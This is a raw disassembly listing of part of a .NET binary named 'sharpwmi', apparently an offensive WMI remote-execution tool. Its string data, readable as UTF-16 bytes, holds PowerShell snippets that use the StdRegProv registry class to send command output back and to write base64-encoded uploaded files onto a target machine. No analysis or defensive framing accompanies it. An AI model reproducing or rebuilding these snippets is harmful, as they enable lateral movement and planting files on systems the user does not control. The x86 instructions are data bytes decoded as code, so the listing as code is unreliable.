  40317c:	2d 00 4f 00 62       	sub    $0x62004f00,%eax
  403181:	00 6a 00             	add    %ch,0x0(%edx)
  403184:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  403188:	74 00                	je     0x40318a
  40318a:	20 00                	and    %al,(%eax)
  40318c:	7b 00                	jnp    0x40318e
  40318e:	24 00                	and    $0x0,%al
  403190:	5f                   	pop    %edi
  403191:	00 2e                	add    %ch,(%esi)
  403193:	00 4e 00             	add    %cl,0x0(%esi)
  403196:	61                   	popa
  403197:	00 6d 00             	add    %ch,0x0(%ebp)
  40319a:	65 00 20             	add    %ah,%gs:(%eax)
  40319d:	00 2d 00 65 00 71    	add    %ch,0x71006500
  4031a3:	00 20                	add    %ah,(%eax)
  4031a5:	00 22                	add    %ah,(%edx)
  4031a7:	00 53 00             	add    %dl,0x0(%ebx)
  4031aa:	74 00                	je     0x4031ac
  4031ac:	64 00 52 00          	add    %dl,%fs:0x0(%edx)
  4031b0:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  4031b4:	50                   	push   %eax
  4031b5:	00 72 00             	add    %dh,0x0(%edx)
  4031b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4031b9:	00 76 00             	add    %dh,0x0(%esi)
  4031bc:	22 00                	and    (%eax),%al
  4031be:	7d 00                	jge    0x4031c0
  4031c0:	3b 00                	cmp    (%eax),%eax
  4031c2:	24 00                	and    $0x0,%al
  4031c4:	72 00                	jb     0x4031c6
  4031c6:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  4031ca:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  4031ce:	65 00 74 00 53       	add    %dh,%gs:0x53(%eax,%eax,1)
  4031d3:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  4031d7:	00 69 00             	add    %ch,0x0(%ecx)
  4031da:	6e                   	outsb  %ds:(%esi),(%dx)
  4031db:	00 67 00             	add    %ah,0x0(%edi)
  4031de:	56                   	push   %esi
  4031df:	00 61 00             	add    %ah,0x0(%ecx)
  4031e2:	6c                   	insb   (%dx),%es:(%edi)
  4031e3:	00 75 00             	add    %dh,0x0(%ebp)
  4031e6:	65 00 28             	add    %ch,%gs:(%eax)
  4031e9:	00 32                	add    %dh,(%edx)
  4031eb:	00 31                	add    %dh,(%ecx)
  4031ed:	00 34 00             	add    %dh,(%eax,%eax,1)
  4031f0:	37                   	aaa
  4031f1:	00 34 00             	add    %dh,(%eax,%eax,1)
  4031f4:	38 00                	cmp    %al,(%eax)
  4031f6:	33 00                	xor    (%eax),%eax
  4031f8:	36 00 35 00 30 00 2c 	add    %dh,%ss:0x2c003000
  4031ff:	00 22                	add    %ah,(%edx)
  403201:	00 22                	add    %ah,(%edx)
  403203:	00 2c 00             	add    %ch,(%eax,%eax,1)
  403206:	22 00                	and    (%eax),%al
  403208:	74 00                	je     0x40320a
  40320a:	78 00                	js     0x40320c
  40320c:	74 00                	je     0x40320e
  40320e:	22 00                	and    (%eax),%al
  403210:	2c 00                	sub    $0x0,%al
  403212:	24 00                	and    $0x0,%al
  403214:	62 00                	bound  %eax,(%eax)
  403216:	29 00                	sub    %eax,(%eax)
  403218:	01 1d 5b 00 2b 00    	add    %ebx,0x2b005b
  40321e:	5d                   	pop    %ebp
  40321f:	00 45 00             	add    %al,0x0(%ebp)
  403222:	78 00                	js     0x403224
  403224:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  403228:	20 00                	and    %al,(%eax)
  40322a:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  40322e:	6e                   	outsb  %ds:(%esi),(%dx)
  40322f:	00 65 00             	add    %ah,0x0(%ebp)
  403232:	21 00                	and    %eax,(%eax)
  403234:	0a 00                	or     (%eax),%al
  403236:	00 15 53 00 74 00    	add    %dl,0x740053
  40323c:	64 00 52 00          	add    %dl,%fs:0x0(%edx)
  403240:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  403244:	50                   	push   %eax
  403245:	00 72 00             	add    %dh,0x0(%edx)
  403248:	6f                   	outsl  %ds:(%esi),(%dx)
  403249:	00 76 00             	add    %dh,0x0(%esi)
  40324c:	00 1d 47 00 65 00    	add    %bl,0x650047
  403252:	74 00                	je     0x403254
  403254:	53                   	push   %ebx
  403255:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  403259:	00 69 00             	add    %ch,0x0(%ecx)
  40325c:	6e                   	outsb  %ds:(%esi),(%dx)
  40325d:	00 67 00             	add    %ah,0x0(%edi)
  403260:	56                   	push   %esi
  403261:	00 61 00             	add    %ah,0x0(%ecx)
  403264:	6c                   	insb   (%dx),%es:(%edi)
  403265:	00 75 00             	add    %dh,0x0(%ebp)
  403268:	65 00 00             	add    %al,%gs:(%eax)
  40326b:	17                   	pop    %ss
  40326c:	73 00                	jae    0x40326e
  40326e:	53                   	push   %ebx
  40326f:	00 75 00             	add    %dh,0x0(%ebp)
  403272:	62 00                	bound  %eax,(%eax)
  403274:	4b                   	dec    %ebx
  403275:	00 65 00             	add    %ah,0x0(%ebp)
  403278:	79 00                	jns    0x40327a
  40327a:	4e                   	dec    %esi
  40327b:	00 61 00             	add    %ah,0x0(%ecx)
  40327e:	6d                   	insl   (%dx),%es:(%edi)
  40327f:	00 65 00             	add    %ah,0x0(%ebp)
  403282:	00 15 73 00 56 00    	add    %dl,0x560073
  403288:	61                   	popa
  403289:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40328d:	00 65 00             	add    %ah,0x0(%ebp)
  403290:	4e                   	dec    %esi
  403291:	00 61 00             	add    %ah,0x0(%ecx)
  403294:	6d                   	insl   (%dx),%es:(%edi)
  403295:	00 65 00             	add    %ah,0x0(%ebp)
  403298:	00 07                	add    %al,(%edi)
  40329a:	74 00                	je     0x40329c
  40329c:	78 00                	js     0x40329e
  40329e:	74 00                	je     0x4032a0
  4032a0:	00 1f                	add    %bl,(%edi)
  4032a2:	5b                   	pop    %ebx
  4032a3:	00 2b                	add    %ch,(%ebx)
  4032a5:	00 5d 00             	add    %bl,0x0(%ebp)
  4032a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4032a9:	00 75 00             	add    %dh,0x0(%ebp)
  4032ac:	74 00                	je     0x4032ae
  4032ae:	70 00                	jo     0x4032b0
  4032b0:	75 00                	jne    0x4032b2
  4032b2:	74 00                	je     0x4032b4
  4032b4:	20 00                	and    %al,(%eax)
  4032b6:	2d 00 3e 00 20       	sub    $0x20003e00,%eax
  4032bb:	00 0a                	add    %cl,(%edx)
  4032bd:	00 0a                	add    %cl,(%edx)
  4032bf:	00 01                	add    %al,(%ecx)
  4032c1:	0d 73 00 56 00       	or     $0x560073,%eax
  4032c6:	61                   	popa
  4032c7:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  4032cb:	00 65 00             	add    %ah,0x0(%ebp)
  4032ce:	00 0d 75 00 70 00    	add    %cl,0x700075
  4032d4:	6c                   	insb   (%dx),%es:(%edi)
  4032d5:	00 6f 00             	add    %ch,0x0(%edi)
  4032d8:	61                   	popa
  4032d9:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  4032dd:	1d 53 00 65 00       	sbb    $0x650053,%eax
  4032e2:	74 00                	je     0x4032e4
  4032e4:	53                   	push   %ebx
  4032e5:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  4032e9:	00 69 00             	add    %ch,0x0(%ecx)
  4032ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4032ed:	00 67 00             	add    %ah,0x0(%edi)
  4032f0:	56                   	push   %esi
  4032f1:	00 61 00             	add    %ah,0x0(%ecx)
  4032f4:	6c                   	insb   (%dx),%es:(%edi)
  4032f5:	00 75 00             	add    %dh,0x0(%ebp)
  4032f8:	65 00 00             	add    %al,%gs:(%eax)
  4032fb:	0f 68 00             	punpckhbw (%eax),%mm0
  4032fe:	44                   	inc    %esp
  4032ff:	00 65 00             	add    %ah,0x0(%ebp)
  403302:	66 00 4b 00          	data16 add %cl,0x0(%ebx)
  403306:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  40330a:	00 81 89 24 00 77    	add    %al,0x77002489(%ecx)
  403310:	00 6d 00             	add    %ch,0x0(%ebp)
  403313:	69 00 20 00 3d 00    	imul   $0x3d0020,(%eax),%eax
  403319:	20 00                	and    %al,(%eax)
  40331b:	5b                   	pop    %ebx
  40331c:	00 77 00             	add    %dh,0x0(%edi)
  40331f:	6d                   	insl   (%dx),%es:(%edi)
  403320:	00 69 00             	add    %ch,0x0(%ecx)
  403323:	63 00                	arpl   %eax,(%eax)
  403325:	6c                   	insb   (%dx),%es:(%edi)
  403326:	00 61 00             	add    %ah,0x0(%ecx)
  403329:	73 00                	jae    0x40332b
  40332b:	73 00                	jae    0x40332d
  40332d:	5d                   	pop    %ebp
  40332e:	00 22                	add    %ah,(%edx)
  403330:	00 52 00             	add    %dl,0x0(%edx)
  403333:	6f                   	outsl  %ds:(%esi),(%dx)
  403334:	00 6f 00             	add    %ch,0x0(%edi)
  403337:	74 00                	je     0x403339
  403339:	5c                   	pop    %esp
  40333a:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40333e:	00 66 00             	add    %ah,0x0(%esi)
  403341:	61                   	popa
  403342:	00 75 00             	add    %dh,0x0(%ebp)
  403345:	6c                   	insb   (%dx),%es:(%edi)
  403346:	00 74 00 3a          	add    %dh,0x3a(%eax,%eax,1)
  40334a:	00 73 00             	add    %dh,0x0(%ebx)
  40334d:	74 00                	je     0x40334f
  40334f:	64 00 52 00          	add    %dl,%fs:0x0(%edx)
  403353:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  403357:	50                   	push   %eax
  403358:	00 72 00             	add    %dh,0x0(%edx)
  40335b:	6f                   	outsl  %ds:(%esi),(%dx)
  40335c:	00 76 00             	add    %dh,0x0(%esi)
  40335f:	22 00                	and    (%eax),%al
  403361:	3b 00                	cmp    (%eax),%eax
  403363:	24 00                	and    $0x0,%al
  403365:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  403369:	74 00                	je     0x40336b
  40336b:	61                   	popa
  40336c:	00 3d 00 28 00 24    	add    %bh,0x24002800
  403372:	00 77 00             	add    %dh,0x0(%edi)
  403375:	6d                   	insl   (%dx),%es:(%edi)
  403376:	00 69 00             	add    %ch,0x0(%ecx)
  403379:	2e 00 47 00          	add    %al,%cs:0x0(%edi)
  40337d:	65 00 74 00 53       	add    %dh,%gs:0x53(%eax,%eax,1)
  403382:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  403386:	00 69 00             	add    %ch,0x0(%ecx)
  403389:	6e                   	outsb  %ds:(%esi),(%dx)
  40338a:	00 67 00             	add    %ah,0x0(%edi)
  40338d:	56                   	push   %esi
  40338e:	00 61 00             	add    %ah,0x0(%ecx)
  403391:	6c                   	insb   (%dx),%es:(%edi)
  403392:	00 75 00             	add    %dh,0x0(%ebp)
  403395:	65 00 28             	add    %ch,%gs:(%eax)
  403398:	00 32                	add    %dh,(%edx)
  40339a:	00 31                	add    %dh,(%ecx)
  40339c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40339f:	37                   	aaa
  4033a0:	00 34 00             	add    %dh,(%eax,%eax,1)
  4033a3:	38 00                	cmp    %al,(%eax)
  4033a5:	33 00                	xor    (%eax),%eax
  4033a7:	36 00 35 00 30 00 2c 	add    %dh,%ss:0x2c003000
  4033ae:	00 22                	add    %ah,(%edx)
  4033b0:	00 22                	add    %ah,(%edx)
  4033b2:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4033b5:	22 00                	and    (%eax),%al
  4033b7:	75 00                	jne    0x4033b9
  4033b9:	70 00                	jo     0x4033bb
  4033bb:	6c                   	insb   (%dx),%es:(%edi)
  4033bc:	00 6f 00             	add    %ch,0x0(%edi)
  4033bf:	61                   	popa
  4033c0:	00 64 00 22          	add    %ah,0x22(%eax,%eax,1)
  4033c4:	00 29                	add    %ch,(%ecx)
  4033c6:	00 29                	add    %ch,(%ecx)
  4033c8:	00 2e                	add    %ch,(%esi)
  4033ca:	00 73 00             	add    %dh,0x0(%ebx)
  4033cd:	56                   	push   %esi
  4033ce:	00 61 00             	add    %ah,0x0(%ecx)
  4033d1:	6c                   	insb   (%dx),%es:(%edi)
  4033d2:	00 75 00             	add    %dh,0x0(%ebp)
  4033d5:	65 00 3b             	add    %bh,%gs:(%ebx)
  4033d8:	00 24 00             	add    %ah,(%eax,%eax,1)
  4033db:	62 00                	bound  %eax,(%eax)
  4033dd:	79 00                	jns    0x4033df
  4033df:	74 00                	je     0x4033e1
  4033e1:	65 00 41 00          	add    %al,%gs:0x0(%ecx)
  4033e5:	72 00                	jb     0x4033e7
  4033e7:	72 00                	jb     0x4033e9
  4033e9:	61                   	popa
  4033ea:	00 79 00             	add    %bh,0x0(%ecx)
  4033ed:	20 00                	and    %al,(%eax)
  4033ef:	3d 00 20 00 5b       	cmp    $0x5b002000,%eax
  4033f4:	00 43 00             	add    %al,0x0(%ebx)
  4033f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4033f8:	00 6e 00             	add    %ch,0x0(%esi)
  4033fb:	76 00                	jbe    0x4033fd
  4033fd:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  403401:	74 00                	je     0x403403
  403403:	5d                   	pop    %ebp
  403404:	00 3a                	add    %bh,(%edx)
  403406:	00 3a                	add    %bh,(%edx)
  403408:	00 46 00             	add    %al,0x0(%esi)
  40340b:	72 00                	jb     0x40340d
  40340d:	6f                   	outsl  %ds:(%esi),(%dx)
  40340e:	00 6d 00             	add    %ch,0x0(%ebp)
  403411:	42                   	inc    %edx
  403412:	00 61 00             	add    %ah,0x0(%ecx)
  403415:	73 00                	jae    0x403417
  403417:	65 00 36             	add    %dh,%gs:(%esi)
  40341a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40341d:	53                   	push   %ebx
  40341e:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  403422:	00 69 00             	add    %ch,0x0(%ecx)
  403425:	6e                   	outsb  %ds:(%esi),(%dx)
  403426:	00 67 00             	add    %ah,0x0(%edi)
  403429:	28 00                	sub    %al,(%eax)
  40342b:	24 00                	and    $0x0,%al
  40342d:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  403431:	74 00                	je     0x403433
  403433:	61                   	popa
  403434:	00 29                	add    %ch,(%ecx)
  403436:	00 3b                	add    %bh,(%ebx)
  403438:	00 5b 00             	add    %bl,0x0(%ebx)
  40343b:	69 00 6f 00 2e 00    	imul   $0x2e006f,(%eax),%eax
  403441:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  403445:	6c                   	insb   (%dx),%es:(%edi)
  403446:	00 65 00             	add    %ah,0x0(%ebp)
  403449:	5d                   	pop    %ebp
  40344a:	00 3a                	add    %bh,(%edx)
  40344c:	00 3a                	add    %bh,(%edx)
  40344e:	00 57 00             	add    %dl,0x0(%edi)
  403451:	72 00                	jb     0x403453
  403453:	69 00 74 00 65 00    	imul   $0x650074,(%eax),%eax
  403459:	41                   	inc    %ecx
  40345a:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40345e:	00 42 00             	add    %al,0x0(%edx)
  403461:	79 00                	jns    0x403463
  403463:	74 00                	je     0x403465
  403465:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  403469:	28 00                	sub    %al,(%eax)
  40346b:	22 00                	and    (%eax),%al
  40346d:	7b 00                	jnp    0x40346f
  40346f:	30 00                	xor    %al,(%eax)
  403471:	3a 00                	cmp    (%eax),%al
  403473:	73 00                	jae    0x403475
  403475:	7d 00                	jge    0x403477
  403477:	22 00                	and    (%eax),%al
  403479:	2c 00                	sub    $0x0,%al
  40347b:	24 00                	and    $0x0,%al
  40347d:	62 00                	bound  %eax,(%eax)
  40347f:	79 00                	jns    0x403481
  403481:	74 00                	je     0x403483
  403483:	65 00 41 00          	add    %al,%gs:0x0(%ecx)
  403487:	72 00                	jb     0x403489
  403489:	72 00                	jb     0x40348b
  40348b:	61                   	popa
  40348c:	00 79 00             	add    %bh,0x0(%ecx)
  40348f:	29 00                	sub    %eax,(%eax)
  403491:	3b 00                	cmp    (%eax),%eax
  403493:	3b 00                	cmp    (%eax),%eax
  403495:	00 29                	add    %ch,(%ecx)
  403497:	5b                   	pop    %ebx
  403498:	00 2b                	add    %ch,(%ebx)
  40349a:	00 5d 00             	add    %bl,0x0(%ebp)
  40349d:	55                   	push   %ebp
  40349e:	00 70 00             	add    %dh,0x0(%eax)
  4034a1:	6c                   	insb   (%dx),%es:(%edi)
  4034a2:	00 6f 00             	add    %ch,0x0(%edi)
  4034a5:	61                   	popa
  4034a6:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  4034aa:	00 66 00             	add    %ah,0x0(%esi)
  4034ad:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  4034b3:	20 00                	and    %al,(%eax)
  4034b5:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  4034b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4034ba:	00 65 00             	add    %ah,0x0(%ebp)
  4034bd:	21 00                	and    %eax,(%eax)
  4034bf:	00 98 73 f2 8d bd    	add    %bl,-0x42720d8d(%eax)
  4034c5:	75 d8                	jne    0x40349f
  4034c7:	4f                   	dec    %edi
  4034c8:	be b1 58 2d 78       	mov    $0x782d58b1,%esi
  4034cd:	46                   	inc    %esi
  4034ce:	3a 64 00 04          	cmp    0x4(%eax,%eax,1),%ah
  4034d2:	20 01                	and    %al,(%ecx)
  4034d4:	01 08                	add    %ecx,(%eax)
  4034d6:	03 20                	add    (%eax),%esp
  4034d8:	00 01                	add    %al,(%ecx)
  4034da:	05 20 01 01 11       	add    $0x11010120,%eax
  4034df:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  4034e2:	01 01                	add    %eax,(%ecx)
  4034e4:	0e                   	push   %cs
  4034e5:	04 20                	add    $0x20,%al
  4034e7:	01 01                	add    %eax,(%ecx)
  4034e9:	02 07                	add    (%edi),%al
  4034eb:	07                   	pop    %es
  4034ec:	03 12                	add    (%edx),%edx
  4034ee:	49                   	dec    %ecx
  4034ef:	12 4d 08             	adc    0x8(%ebp),%cl
  4034f2:	09 20                	or     %esp,(%eax)
  4034f4:	03 01                	add    (%ecx),%eax
  4034f6:	12 45 12             	adc    0x12(%ebp),%al
  4034f9:	55                   	push   %ebp
  4034fa:	12 59 05             	adc    0x5(%ecx),%bl
  4034fd:	20 01                	and    %al,(%ecx)
  4034ff:	12 4d 0e             	adc    0xe(%ebp),%cl
  403502:	05 20 02 01 0e       	add    $0xe010220,%eax
  403507:	1c 09                	sbb    $0x9,%al
  403509:	20 03                	and    %al,(%ebx)
  40350b:	12 4d 0e             	adc    0xe(%ebp),%cl
  40350e:	12 4d 12             	adc    0x12(%ebp),%cl
  403511:	61                   	popa
  403512:	04 00                	add    $0x0,%al
  403514:	00 12                	add    %dl,(%edx)
  403516:	69 05 20 01 1d 05 0e 	imul   $0x100050e,0x51d0120,%eax
  40351d:	05 00 01 
  403520:	0e                   	push   %cs
  403521:	1d 05 04 07 01       	sbb    $0x1070405,%eax
  403526:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40352b:	1d 05 0e 05 20       	sbb    $0x20050e05,%eax
  403530:	01 0e                	add    %ecx,(%esi)
  403532:	1d 05 26 07 1a       	sbb    $0x1a072605,%eax
  403537:	0e                   	push   %cs
  403538:	0e                   	push   %cs
  403539:	0e                   	push   %cs
  40353a:	0e                   	push   %cs
  40353b:	0e                   	push   %cs
  40353c:	12 51 08             	adc    0x8(%ecx),%dl
  40353f:	0e                   	push   %cs
  403540:	0e                   	push   %cs
  403541:	12 4d 12             	adc    0x12(%ebp),%cl
  403544:	4d                   	dec    %ebp
  403545:	1d 05 12 4d 0e       	sbb    $0xe4d1205,%eax
  40354a:	0e                   	push   %cs
  40354b:	12 51 0e             	adc    0xe(%ecx),%dl
  40354e:	08 0e                	or     %cl,(%esi)
  403550:	0e                   	push   %cs
  403551:	12 4d 12             	adc    0x12(%ebp),%cl
  403554:	4d                   	dec    %ebp
  403555:	1d 05 12 4d 0e       	sbb    $0xe4d1205,%eax
  40355a:	0e                   	push   %cs
  40355b:	04 00                	add    $0x0,%al
  40355d:	01 01                	add    %eax,(%ecx)
  40355f:	0e                   	push   %cs
  403560:	05 00 02 02 0e       	add    $0xe020200,%eax
  403565:	0e                   	push   %cs
  403566:	06                   	push   %es
  403567:	00 03                	add    %al,(%ebx)
  403569:	0e                   	push   %cs
  40356a:	0e                   	push   %cs
  40356b:	0e                   	push   %cs
  40356c:	0e                   	push   %cs
  40356d:	06                   	push   %es
  40356e:	20 02                	and    %al,(%edx)
  403570:	01 0e                	add    %ecx,(%esi)
  403572:	12 51 04             	adc    0x4(%ecx),%dl
  403575:	20 00                	and    %al,(%eax)
  403577:	12 51 05             	adc    0x5(%ecx),%dl
  40357a:	20 01                	and    %al,(%ecx)
  40357c:	01 11                	add    %edx,(%ecx)
  40357e:	79 05                	jns    0x403585
  403580:	00 02                	add    %al,(%edx)
  403582:	0e                   	push   %cs
  403583:	0e                   	push   %cs
  403584:	0e                   	push   %cs
  403585:	04 00                	add    $0x0,%al
  403587:	01 01                	add    %eax,(%ecx)
  403589:	08 04 20             	or     %al,(%eax,%eiz,1)
  40358c:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40358f:	03 20                	add    (%eax),%esp
  403591:	00 0e                	add    %cl,(%esi)
  403593:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  403598:	1c 08                	sbb    $0x8,%al
  40359a:	b7 7a                	mov    $0x7a,%bh
  40359c:	5c                   	pop    %esp
  40359d:	56                   	push   %esi
  40359e:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  4035a1:	89 08                	mov    %ecx,(%eax)
  4035a3:	b0 3f                	mov    $0x3f,%al
  4035a5:	5f                   	pop    %edi
  4035a6:	7f 11                	jg     0x4035b9
  4035a8:	d5 0a                	aad    $0xa
  4035aa:	3a 03                	cmp    (%ebx),%al
  4035ac:	06                   	push   %es
  4035ad:	12 45 04             	adc    0x4(%ebp),%al
  4035b0:	20 01                	and    %al,(%ecx)
  4035b2:	08 0e                	or     %cl,(%esi)
  4035b4:	04 00                	add    $0x0,%al
  4035b6:	01 0e                	add    %ecx,(%esi)
  4035b8:	0e                   	push   %cs
  4035b9:	05 20 01 01 1d       	add    $0x1d010120,%eax
  4035be:	0e                   	push   %cs
  4035bf:	05 00 01 01 1d       	add    $0x1d010100,%eax
  4035c4:	0e                   	push   %cs
  4035c5:	08 01                	or     %al,(%ecx)
  4035c7:	00 08                	add    %cl,(%eax)
  4035c9:	00 00                	add    %al,(%eax)
  4035cb:	00 00                	add    %al,(%eax)
  4035cd:	00 1e                	add    %bl,(%esi)
  4035cf:	01 00                	add    %eax,(%eax)
  4035d1:	01 00                	add    %eax,(%eax)
  4035d3:	54                   	push   %esp
  4035d4:	02 16                	add    (%esi),%dl
  4035d6:	57                   	push   %edi
  4035d7:	72 61                	jb     0x40363a
  4035d9:	70 4e                	jo     0x403629
  4035db:	6f                   	outsl  %ds:(%esi),(%dx)
  4035dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4035dd:	45                   	inc    %ebp
  4035de:	78 63                	js     0x403643
  4035e0:	65 70 74             	gs jo  0x403657
  4035e3:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  4035ea:	77 73                	ja     0x40365f
  4035ec:	01 08                	add    %ecx,(%eax)
  4035ee:	01 00                	add    %eax,(%eax)
  4035f0:	02 00                	add    (%eax),%al
  4035f2:	00 00                	add    %al,(%eax)
  4035f4:	00 00                	add    %al,(%eax)
  4035f6:	0d 01 00 08 73       	or     $0x73080001,%eax
  4035fb:	68 61 72 70 77       	push   $0x77707261
  403600:	6d                   	insl   (%dx),%es:(%edi)
  403601:	69 00 00 05 01 00    	imul   $0x10500,(%eax),%eax
  403607:	00 00                	add    %al,(%eax)
  403609:	00 17                	add    %dl,(%edi)
  40360b:	01 00                	add    %eax,(%eax)
  40360d:	12 43 6f             	adc    0x6f(%ebx),%al
  403610:	70 79                	jo     0x40368b
  403612:	72 69                	jb     0x40367d
  403614:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
  40361a:	20 20                	and    %ah,(%eax)
  40361c:	32 30                	xor    (%eax),%dh
  40361e:	32 30                	xor    (%eax),%dh
  403620:	00 00                	add    %al,(%eax)
  403622:	29 01                	sub    %eax,(%ecx)
  403624:	00 24 62             	add    %ah,(%edx,%eiz,2)
  403627:	62 33                	bound  %esi,(%ebx)
  403629:	35 37 64 33 38       	xor    $0x38336437,%eax
  40362e:	2d 36 64 63 31       	sub    $0x31636436,%eax
  403633:	2d 34 66 32 30       	sub    $0x30326634,%eax
  403638:	2d 61 35 34 63       	sub    $0x63343561,%eax
  40363d:	2d 64 36 36 34       	sub    $0x34363664,%eax
  403642:	62 64 32 30          	bound  %esp,0x30(%edx,%esi,1)
  403646:	36 37                	ss aaa
  403648:	37                   	aaa
  403649:	65 00 00             	add    %al,%gs:(%eax)
  40364c:	0c 01                	or     $0x1,%al
  40364e:	00 07                	add    %al,(%edi)
  403650:	31 2e                	xor    %ebp,(%esi)
  403652:	30 2e                	xor    %ch,(%esi)
  403654:	30 2e                	xor    %ch,(%esi)
  403656:	30 00                	xor    %al,(%eax)
  403658:	00 47 01             	add    %al,0x1(%edi)
  40365b:	00 1a                	add    %bl,(%edx)
  40365d:	2e 4e                	cs dec %esi
  40365f:	45                   	inc    %ebp
  403660:	54                   	push   %esp
  403661:	46                   	inc    %esi
  403662:	72 61                	jb     0x4036c5
  403664:	6d                   	insl   (%dx),%es:(%edi)
  403665:	65 77 6f             	gs ja  0x4036d7
  403668:	72 6b                	jb     0x4036d5
  40366a:	2c 56                	sub    $0x56,%al
  40366c:	65 72 73             	gs jb  0x4036e2
  40366f:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  403676:	30 01                	xor    %al,(%ecx)
  403678:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  40367c:	46                   	inc    %esi
  40367d:	72 61                	jb     0x4036e0
  40367f:	6d                   	insl   (%dx),%es:(%edi)
  403680:	65 77 6f             	gs ja  0x4036f2
  403683:	72 6b                	jb     0x4036f0
  403685:	44                   	inc    %esp
  403686:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40368d:	61                   	popa
  40368e:	6d                   	insl   (%dx),%es:(%edi)
  40368f:	65 10 2e             	adc    %ch,%gs:(%esi)
  403692:	4e                   	dec    %esi
  403693:	45                   	inc    %ebp
  403694:	54                   	push   %esp
  403695:	20 46 72             	and    %al,0x72(%esi)
  403698:	61                   	popa
  403699:	6d                   	insl   (%dx),%es:(%edi)
  40369a:	65 77 6f             	gs ja  0x40370c
  40369d:	72 6b                	jb     0x40370a
  40369f:	20 34 00             	and    %dh,(%eax,%eax,1)
	...
  4036ae:	00 00                	add    %al,(%eax)
  4036b0:	10 00                	adc    %al,(%eax)
	...
  4036be:	00 00                	add    %al,(%eax)
  4036c0:	e8 36 00 00 00       	call   0x4036fb
  4036c5:	00 00                	add    %al,(%eax)
  4036c7:	00 00                	add    %al,(%eax)
  4036c9:	00 00                	add    %al,(%eax)
  4036cb:	00 02                	add    %al,(%edx)
  4036cd:	37                   	aaa
  4036ce:	00 00                	add    %al,(%eax)
  4036d0:	00 20                	add    %ah,(%eax)
	...
  4036e6:	00 00                	add    %al,(%eax)
  4036e8:	f4                   	hlt
  4036e9:	36 00 00             	add    %al,%ss:(%eax)
	...
  4036f4:	00 00                	add    %al,(%eax)
  4036f6:	5f                   	pop    %edi
  4036f7:	43                   	inc    %ebx
  4036f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4036f9:	72 45                	jb     0x403740
  4036fb:	78 65                	js     0x403762
  4036fd:	4d                   	dec    %ebp
  4036fe:	61                   	popa
  4036ff:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  403706:	72 65                	jb     0x40376d
  403708:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40370c:	6c                   	insb   (%dx),%es:(%edi)
  40370d:	00 00                	add    %al,(%eax)
  40370f:	00 00                	add    %al,(%eax)
  403711:	00 ff                	add    %bh,%bh
  403713:	25 00 20 40 00       	and    $0x402000,%eax
